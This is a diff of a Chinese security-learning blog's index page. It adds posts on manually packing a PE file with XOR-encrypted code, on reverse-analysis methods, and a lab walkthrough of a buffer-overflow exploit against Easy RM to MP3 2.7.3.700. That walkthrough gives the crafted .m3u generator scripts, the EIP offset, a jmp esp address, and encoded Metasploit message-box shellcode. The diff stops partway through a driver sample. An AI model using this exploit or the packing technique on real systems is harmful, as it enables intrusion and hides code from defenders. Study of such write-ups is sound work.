@@ -157,6 +157,98 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-脱壳_手工加壳" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/05/脱壳_手工加壳/">加壳</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/10/05/脱壳_手工加壳/" class="archive-article-date">
+  	<time datetime="2018-10-05T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-05</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>壳代码基本流程</p>
+</blockquote>
+<p>1.保存寄存器环境<br>2.加载一些必要API<br>3.解密代码和数据<br>4.修复重定位<br>5.填充IAT<br>6.恢复寄存器环境</p>
+<blockquote>
+<p>手工加壳实例</p>
+</blockquote>
+<ul>
+<li>使用loadPE添加新的区段并修改区段信息<br><img src="http://picture.jbyusk.com:8080/dump/dump01.jpg" alt=""><br><img src="http://picture.jbyusk.com:8080/dump/dump02.jpg" alt=""></li>
+<li>使用010editor或者其他工具在新区段物理偏移地址开始位置填充区段大小的内容<br><img src="http://picture.jbyusk.com:8080/dump/dump03.jpg" alt=""></li>
+<li>在新区段写入新eop代码,并修改EOP地址为新的EOP地址<br><img src="http://picture.jbyusk.com:8080/dump/dump04.jpg" alt=""></li>
+<li>使用010加密比如使用xor加密,在汇编中对代码段解密,为了不处理重定向,取消随机地址<br><img src="http://picture.jbyusk.com:8080/dump/dump05.jpg" alt=""></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">脱壳</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/05/脱壳_手工加壳/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
     <article id="post-脱壳基础01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -226,98 +318,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/10/05/脱壳基础01/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-脱壳_手工加壳" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/05/脱壳_手工加壳/">加壳</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/10/05/脱壳_手工加壳/" class="archive-article-date">
-  	<time datetime="2018-10-05T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-05</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>壳代码基本流程</p>
-</blockquote>
-<p>1.保存寄存器环境<br>2.加载一些必要API<br>3.解密代码和数据<br>4.修复重定位<br>5.填充IAT<br>6.恢复寄存器环境</p>
-<blockquote>
-<p>手工加壳实例</p>
-</blockquote>
-<ul>
-<li>使用loadPE添加新的区段并修改区段信息<br><img src="http://picture.jbyusk.com:8080/dump/dump01.jpg" alt=""><br><img src="http://picture.jbyusk.com:8080/dump/dump02.jpg" alt=""></li>
-<li>使用010editor或者其他工具在新区段物理偏移地址开始位置填充区段大小的内容<br><img src="http://picture.jbyusk.com:8080/dump/dump03.jpg" alt=""></li>
-<li>在新区段写入新eop代码,并修改EOP地址为新的EOP地址<br><img src="http://picture.jbyusk.com:8080/dump/dump04.jpg" alt=""></li>
-<li>使用010加密比如使用xor加密,在汇编中对代码段解密,为了不处理重定向,取消随机地址<br><img src="http://picture.jbyusk.com:8080/dump/dump05.jpg" alt=""></li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">脱壳</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/05/脱壳_手工加壳/">展开全文 >></a>
         </p>
       
 
@@ -741,6 +741,208 @@
         <!-- 目录内容结束 -->
 
   
+    <article id="post-Easy RM to MP3 2.7.3.700" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/Easy RM to MP3 2.7.3.700/">Easy RM to MP3 2.7.3.700</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/Easy RM to MP3 2.7.3.700/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>实验版本:<br>windows sp2<br>Easy RM to MP3 2.7.3.700<br>ollydbg</p>
+<blockquote>
+<p>验证漏洞存在</p>
+</blockquote>
+<ol>
+<li><p>使用python脚本创建一个m3u文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#分别尝试10000,20000,30000,发现30000时候才会发生内存访问异常</span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    #for i in range(0,30000):</span><br><span class="line">    f.write(&quot;\x41&quot; * 30000)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用Easy RM to MP3载入文件<br>0x41414141即为AAAA,所以很有可能是由于缓冲区溢出导致访问了AAAA的地址<br><img src="http://picture.jbyusk.com:8080/exploit1-10/exploit1.png" alt=""></p>
+</li>
+</ol>
+<blockquote>
+<p>确定EIP返回地址</p>
+</blockquote>
+<p>1.尝试使用二分法缩小范围<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * 25000)</span><br><span class="line">    f.write(&quot;\x42&quot; * 5000)</span><br></pre></td></tr></table></figure></p>
+<p>确定为返回地址在25000到30000之间<br><img src="http://picture.jbyusk.com:8080/exploit1-10/exploit2.png" alt=""></p>
+<ol>
+<li>使用msfconsole生成5000个字节<br>./pattern_create.rb -l 5000 #复制到最后5000个字节</li>
+<li><p>确认EIP位置<br>使用ollydbg再次执行发现eip为366A4235<br>./pattern_offset.rb -q 0x366A4235<br>[*] Exact match at offset 1067 #获得位置在1067</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x42&quot; *4)</span><br></pre></td></tr></table></figure>
+<p>ollydbg异常eip为42424242</p>
+</li>
+</ol>
+<blockquote>
+<p>编写shellcode</p>
+</blockquote>
+<ol>
+<li>确认shellcode存放位置<br>通过观察od,发现esp指向的位置再返回地址+4的位置,之所以+4是因为该函数参数最后执行retn 4.<br>所以可以确认可以将shellcode放置再esp位置,然后通过jmp esp(FF E4)跳转过去.<br>所以eip地址应该存一个指向jmp esp的地址,最好寻找软件自带的dll作为跳转地址.<br>选择MSRMCcodec02.dll,调整到该模块使用查找命令,找到一个地址0x023FF23A(注意地址不能包含00,否则会发送字符串结束,shellcode会被截断)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x3A\xF2\x3F\x02&quot; ) #eip</span><br><span class="line">    f.write(&quot;\x90&quot; *25)</span><br><span class="line">    f.write(&quot;\xCC&quot;)</span><br><span class="line">    f.write(&quot;\x90&quot; *25)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>执行后发现发生中断在int 3</p>
+<ul>
+<li>使用metasploit生成messagebox的shellcode<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use payload/windows/messagebox</span><br><span class="line">generate -b &quot;\x00&quot; -e x86/alpha_upper -t python</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x3A\xF2\x3F\x02&quot; ) #eip</span><br><span class="line">    f.write(&quot;\x90&quot; * 25 )</span><br><span class="line">    buf = &quot;&quot;</span><br><span class="line">    buf += &quot;\x89\xe7\xdd\xc1\xd9\x77\xf4\x5e\x56\x59\x49\x49\x49&quot;</span><br><span class="line">    buf += &quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span><br><span class="line">    buf += &quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span><br><span class="line">    buf += &quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span><br><span class="line">    buf += &quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span><br><span class="line">    buf += &quot;\x4a\x49\x58\x59\x4a\x4b\x4d\x4b\x38\x59\x34\x34\x36&quot;</span><br><span class="line">    buf += &quot;\x44\x4b\x44\x30\x31\x39\x42\x4f\x42\x33\x47\x46\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x49\x33\x54\x4c\x4b\x32\x51\x56\x50\x4c\x4b\x52&quot;</span><br><span class="line">    buf += &quot;\x56\x34\x4c\x4c\x4b\x33\x46\x55\x4c\x4c\x4b\x37\x36&quot;</span><br><span class="line">    buf += &quot;\x53\x38\x4c\x4b\x53\x4e\x47\x50\x4c\x4b\x46\x56\x46&quot;</span><br><span class="line">    buf += &quot;\x58\x50\x4f\x45\x48\x44\x35\x4c\x33\x46\x39\x45\x51&quot;</span><br><span class="line">    buf += &quot;\x48\x51\x4b\x4f\x4b\x51\x55\x30\x4c\x4b\x42\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x34\x4c\x4b\x37\x35\x47\x4c\x4c\x4b\x56\x34&quot;</span><br><span class="line">    buf += &quot;\x36\x48\x32\x58\x35\x51\x4b\x5a\x4c\x4b\x30\x4a\x45&quot;</span><br><span class="line">    buf += &quot;\x48\x4c\x4b\x51\x4a\x51\x30\x55\x51\x4a\x4b\x5a\x43&quot;</span><br><span class="line">    buf += &quot;\x30\x34\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x35\x51\x4a&quot;</span><br><span class="line">    buf += &quot;\x4e\x46\x51\x4b\x4f\x50\x31\x4f\x30\x4b\x4c\x4e\x4c&quot;</span><br><span class="line">    buf += &quot;\x4d\x54\x39\x50\x52\x54\x33\x37\x49\x51\x38\x4f\x44&quot;</span><br><span class="line">    buf += &quot;\x4d\x35\x51\x49\x57\x5a\x4b\x4c\x34\x57\x4b\x43\x4c&quot;</span><br><span class="line">    buf += &quot;\x31\x34\x47\x58\x32\x55\x4d\x31\x4c\x4b\x30\x5a\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x53\x31\x4a\x4b\x42\x46\x4c\x4b\x54\x4c\x30\x4b&quot;</span><br><span class="line">    buf += &quot;\x4c\x4b\x50\x5a\x35\x4c\x53\x31\x5a\x4b\x4c\x4b\x35&quot;</span><br><span class="line">    buf += &quot;\x54\x4c\x4b\x35\x51\x4b\x58\x4d\x59\x30\x44\x51\x34&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x45\x31\x49\x53\x48\x32\x43\x38\x47\x59\x49&quot;</span><br><span class="line">    buf += &quot;\x44\x4d\x59\x4d\x35\x4c\x49\x59\x52\x33\x58\x4c\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x4e\x54\x4e\x4a\x4c\x51\x42\x4d\x38\x4d\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x4b\x4f\x4c\x49\x50\x45\x34\x44\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x43\x4e\x49\x48\x4d\x32\x52\x53\x4c\x47\x45\x4c\x57&quot;</span><br><span class="line">    buf += &quot;\x54\x31\x42\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f&quot;</span><br><span class="line">    buf += &quot;\x4b\x39\x30\x45\x34\x48\x32\x48\x52\x4c\x32\x4c\x51&quot;</span><br><span class="line">    buf += &quot;\x30\x51\x51\x45\x38\x57\x43\x36\x52\x46\x4e\x33\x54&quot;</span><br><span class="line">    buf += &quot;\x35\x38\x32\x55\x34\x33\x43\x55\x34\x32\x46\x50\x49&quot;</span><br><span class="line">    buf += &quot;\x4b\x4c\x48\x31\x4c\x46\x44\x55\x5a\x4b\x39\x4d\x36&quot;</span><br><span class="line">    buf += &quot;\x50\x56\x4b\x4f\x46\x35\x54\x44\x4c\x49\x58\x42\x50&quot;</span><br><span class="line">    buf += &quot;\x50\x4f\x4b\x49\x38\x39\x32\x50\x4d\x4f\x4c\x4c\x47&quot;</span><br><span class="line">    buf += &quot;\x45\x4c\x57\x54\x46\x32\x4a\x48\x51\x4f\x4b\x4f\x4b&quot;</span><br><span class="line">    buf += &quot;\x4f\x4b\x4f\x35\x38\x42\x4f\x43\x48\x56\x38\x57\x50&quot;</span><br><span class="line">    buf += &quot;\x45\x38\x43\x51\x42\x47\x45\x35\x31\x52\x35\x38\x30&quot;</span><br><span class="line">    buf += &quot;\x4d\x43\x55\x54\x33\x43\x43\x50\x31\x59\x4b\x4b\x38&quot;</span><br><span class="line">    buf += &quot;\x51\x4c\x36\x44\x35\x5a\x4c\x49\x5a\x43\x53\x58\x30&quot;</span><br><span class="line">    buf += &quot;\x58\x37\x50\x51\x30\x51\x30\x52\x48\x50\x4d\x36\x33&quot;</span><br><span class="line">    buf += &quot;\x51\x56\x31\x31\x35\x38\x53\x42\x42\x4f\x52\x4d\x47&quot;</span><br><span class="line">    buf += &quot;\x50\x35\x38\x42\x4f\x46\x4c\x47\x50\x45\x36\x45\x38&quot;</span><br><span class="line">    buf += &quot;\x57\x38\x42\x45\x32\x4c\x42\x4c\x50\x31\x58\x49\x4c&quot;</span><br><span class="line">    buf += &quot;\x48\x50\x4c\x57\x54\x34\x50\x4c\x49\x4d\x31\x50\x31&quot;</span><br><span class="line">    buf += &quot;\x38\x52\x36\x32\x56\x33\x56\x31\x46\x32\x4b\x4f\x4e&quot;</span><br><span class="line">    buf += &quot;\x30\x36\x51\x49\x50\x36\x30\x4b\x4f\x50\x55\x53\x38&quot;</span><br><span class="line">    buf += &quot;\x41\x41&quot;</span><br><span class="line">    f.write(buf)</span><br></pre></td></tr></table></figure>
+<p>结果<br><img src="http://picture.jbyusk.com:8080/exploit1-10/exploit3.png" alt=""></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/Easy RM to MP3 2.7.3.700/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-逆向分析方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/逆向分析方法/">逆向分析方法</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/逆向分析方法/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>自上而下的分析<br>从程序入口点开始分析,模拟程序运行的整个流程,对程序进行分析</li>
+<li>自下而上分析<br>找到关键API,栈回溯分析,比如程序弹出MessageBoxA/W，从弹框栈回溯分析找到窗口回调函数,从窗口回调函数开始分析</li>
+<li>字符串分析<br>根据弹窗提示的字符串,再调试器中查找,定位关键代码,再分析<br>根据调试时查看到的第三方库的版本号<br>比如:加密通讯库openssl  嵌入式脚本lua</li>
+<li>源码对比分析<br>分析源码特征,然后去调试分析<br>5.假设某一个函数的内部复杂,可以在成功调用函数的代码处,不停调用目标函数,构造类似参数,从返回值,传出参数来判断函数的功能。</li>
+</ol>
+<p>分析心态:分析过程中不停猜测程序的意图和流程</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">逆向</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/逆向分析方法/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
     <article id="post-dll文件的导出和调用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -820,172 +1022,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/08/20/dll文件的导出和调用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-驱动开发" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/驱动开发/">驱动开发</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/驱动开发/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>内核驱动程序</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">C程序:</span><br><span class="line">/***************************************************************************</span><br><span class="line">	created:	2018/1/19</span><br><span class="line">	filename:	E:\0day\HelloWorld\helloworld.c</span><br><span class="line">	author:		test</span><br><span class="line">	purpose		Hello World driver demo</span><br><span class="line">***************************************************************************/</span><br><span class="line"></span><br><span class="line">#include&lt;ntddk.h&gt;</span><br><span class="line">#define DEVICE_NAME L&quot;\\Device\\HelloWorld&quot;</span><br><span class="line">#define DEVICE_LINK	L&quot;\\DosDevices\\HelloWorld&quot;</span><br><span class="line">//创建的设备对象指针</span><br><span class="line">PDEVICE_OBJECT g_DeviceObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/***************************************************************************</span><br><span class="line">驱动卸载函数</span><br><span class="line">		输入：驱动对象的指针</span><br><span class="line">		输出：无</span><br><span class="line">***************************************************************************/</span><br><span class="line">VOID DriverUnload(IN PDRIVER_OBJECT driverObject)</span><br><span class="line">&#123;</span><br><span class="line">	//什么都不做，就打印一句话</span><br><span class="line">	KdPrint((&quot;DriverUnload:88!\n&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/***************************************************************************</span><br><span class="line">驱动派遣例程函数</span><br><span class="line">		输入：驱动对象的指针,Irp指针</span><br><span class="line">		输出：NTSTATUS类型的结果</span><br><span class="line">***************************************************************************/</span><br><span class="line">NTSTATUS DrvDispatch(IN PDEVICE_OBJECT driverObject,IN PIRP pIrp)</span><br><span class="line">&#123;</span><br><span class="line">	KdPrint((&quot;Enter DrvDispatch\n&quot;));</span><br><span class="line">	//设置IRP的完成状态</span><br><span class="line">	pIrp-&gt;IoStatus.Status=STATUS_SUCCESS;</span><br><span class="line">	//设置IRP的操作字节数</span><br><span class="line">	pIrp-&gt;IoStatus.Information=0;</span><br><span class="line">	//完成IRP的处理</span><br><span class="line">	IoCompleteRequest(pIrp,IO_NO_INCREMENT);</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/***************************************************************************</span><br><span class="line">驱动入口函数</span><br><span class="line">		输入：驱动对象的指针,服务程序对应的注册表路径</span><br><span class="line">		输出：NTSTATUS类型的结果</span><br><span class="line">***************************************************************************/</span><br><span class="line">NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject,</span><br><span class="line">					 IN PUNICODE_STRING registryPath)</span><br><span class="line">&#123;</span><br><span class="line">	NTSTATUS	ntStatus;</span><br><span class="line">	UNICODE_STRING devName;</span><br><span class="line">	UNICODE_STRING symLinkName;</span><br><span class="line"></span><br><span class="line">	int i=0;</span><br><span class="line">	//打印一句调试信息</span><br><span class="line">	KdPrint((&quot;DriverEntry: Hello world driver demo!\n&quot;));</span><br><span class="line">	//设置该驱动对象的卸载函数</span><br><span class="line">	driverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	//创建设备</span><br><span class="line">	RtlInitUnicodeString(&amp;devName,DEVICE_NAME);</span><br><span class="line">	ntStatus = IoCreateDevice(driverObject,</span><br><span class="line">				0,</span><br><span class="line">				&amp;devName,</span><br><span class="line">				FILE_DEVICE_UNKNOWN,</span><br><span class="line">				0,TRUE,</span><br><span class="line">				&amp;g_DeviceObject);</span><br><span class="line">	if(!NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(g_DeviceObject);</span><br><span class="line">		return ntStatus;</span><br><span class="line">	&#125;</span><br><span class="line">	//创建符号链接</span><br><span class="line">	RtlInitUnicodeString(&amp;symLinkName,DEVICE_LINK);</span><br><span class="line">	